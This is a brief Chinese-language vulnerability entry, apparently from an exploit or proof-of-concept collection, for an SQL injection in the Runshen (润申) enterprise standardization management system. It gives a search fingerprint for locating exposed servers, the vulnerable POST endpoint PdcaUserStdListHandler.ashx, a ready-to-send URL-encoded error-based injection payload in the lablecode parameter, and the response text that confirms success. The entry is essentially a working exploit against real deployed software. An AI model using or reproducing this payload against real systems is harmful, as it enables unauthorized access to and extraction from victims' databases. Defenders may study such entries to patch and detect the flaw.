# 润申信息企业标准化管理系统PdcaUserStdListHandler.ashx存在SQL注入漏洞

润申信息企业标准化管理系统 ｜ SQL注入 ｜ —
- **指纹**：`body="PDCA/js/_publicCom.js"`
- **请求**：`POST /PDCA/ashx/PdcaUserStdListHandler.ashx?action=GetDataBy HTTP/1.1`

**Payload**
```
code=1&lablecode=-9458%29+OR+5511+IN+%28SELECT+%28CHAR%28113%29%2BCHAR%28112%29%2BCHAR%28112%29%2BCHAR%28113%29%2BCHAR%28113%29%2B%28SELECT+%28CASE+WHEN+%285511%3D5511%29+THEN+CHAR%2849%29+ELSE+CHAR%2848%29+END%29%29%2BCHAR%28113%29%2BCHAR%28120%29%2BCHAR%28107%29%2BCHAR%28107%29%2BCHAR%28113%29%29%29--+XeuQ&LableName=&page=1&rows=20
```
- **响应特征**：200 附近有语法错误